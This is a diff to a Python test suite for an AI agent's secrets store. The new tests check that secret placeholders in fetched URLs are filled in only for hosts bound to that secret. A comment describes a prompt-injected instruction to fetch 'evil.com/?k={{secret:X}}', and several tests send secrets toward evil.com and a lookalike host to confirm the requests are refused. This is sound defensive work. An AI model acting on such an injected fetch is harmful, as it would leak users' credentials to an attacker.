@@ -104,7 +104,8 @@ async def test_secrets_api_never_returns_values(client):
     r = await client.get("/api/secrets")
     body = r.text
     assert "sk-live-999888" not in body
-    assert r.json()["secrets"] == [{"name": "TBA_KEY", "last4": "9888"}]
+    assert r.json()["secrets"] == [{"name": "TBA_KEY", "last4": "9888",
+                                    "hosts": []}]
     r = await client.put("/api/secrets/bad name!", json={"value": "x"})
     assert r.status_code == 400
     r = await client.delete("/api/secrets/TBA_KEY")
@@ -119,3 +120,65 @@ async def test_secret_names_ride_context(tmp_env):
     assert "STATBOTICS_KEY" in prompt
     assert "{{secret:NAME}}" in prompt
     assert "v" * 12 not in prompt          # never the value
+
+
+# --- web-bound secrets: {{secret:NAME}} in web_read URLs ----------------------
+# A secret opts into web use by listing hosts; substitution happens only
+# toward those hosts, so a prompt-injected "fetch evil.com/?k={{secret:X}}"
+# refuses instead of laundering the key out.
+
+def test_substitute_url_enforces_host_binding(tmp_env):
+    secrets.save({"NEWSAPI": {"value": "k-123456789", "hosts": ["newsapi.org"]},
+                  "VMONLY": "v-987654321"})
+    ok = secrets.substitute_url(
+        "https://newsapi.org/v2/top?apiKey={{secret:NEWSAPI}}")
+    assert ok == "https://newsapi.org/v2/top?apiKey=k-123456789"
+    # subdomains of a bound host are fine
+    ok = secrets.substitute_url("https://api.newsapi.org/x?k={{secret:NEWSAPI}}")
+    assert "k-123456789" in ok
+
+    with pytest.raises(ValueError, match="bound to newsapi.org"):
+        secrets.substitute_url("https://evil.com/?k={{secret:NEWSAPI}}")
+    with pytest.raises(ValueError, match="no web hosts bound"):
+        secrets.substitute_url("https://anything.com/?k={{secret:VMONLY}}")
+    with pytest.raises(KeyError, match="unknown secret"):
+        secrets.substitute_url("https://x.com/?k={{secret:GHOST}}")
+    # a lookalike host doesn't pass the suffix check
+    with pytest.raises(ValueError, match="refusing"):
+        secrets.substitute_url("https://notnewsapi.org/?k={{secret:NEWSAPI}}")
+
+
+def test_v2_file_format_and_hosts_roundtrip(tmp_env):
+    secrets.save({"A": {"value": "val-abcdef", "hosts": ["Api.Example.com"]},
+                  "B": "plain-value-1"})
+    assert secrets.load() == {"A": "val-abcdef", "B": "plain-value-1"}
+    assert secrets.hosts_for("A") == ["api.example.com"]
+    assert secrets.hosts_for("B") == []
+    # scrub still sees v2 values
+    assert secrets.scrub("leak val-abcdef here") == "leak {{secret:A}} here"
+
+
+async def test_web_read_refuses_unbound_secret_before_any_network(tmp_env):
+    from backend import webtools
+    from backend.db import init_db
+    await init_db()
+    secrets.save({"VMONLY": "v-987654321"})
+    out = await webtools.read("https://example.com/?k={{secret:VMONLY}}", "s")
+    assert out.startswith("error:") and "no web hosts bound" in out
+    assert "v-987654321" not in out
+
+
+async def test_secrets_api_hosts_roundtrip(client):
+    r = await client.put("/api/secrets/NEWSAPI",
+                         json={"value": "k-123456789",
+                               "hosts": ["NewsAPI.org", " "]})
+    assert r.json()["hosts"] == ["newsapi.org"]
+    lst = (await client.get("/api/secrets")).json()["secrets"]
+    entry = next(s for s in lst if s["name"] == "NEWSAPI")
+    assert entry["hosts"] == ["newsapi.org"] and entry["last4"] == "6789"
+    # hosts-only edit: empty value keeps the stored key
+    r = await client.put("/api/secrets/NEWSAPI",
+                         json={"value": "", "hosts": []})
+    assert r.status_code == 200
+    assert secrets.load()["NEWSAPI"] == "k-123456789"
+    assert secrets.hosts_for("NEWSAPI") == []
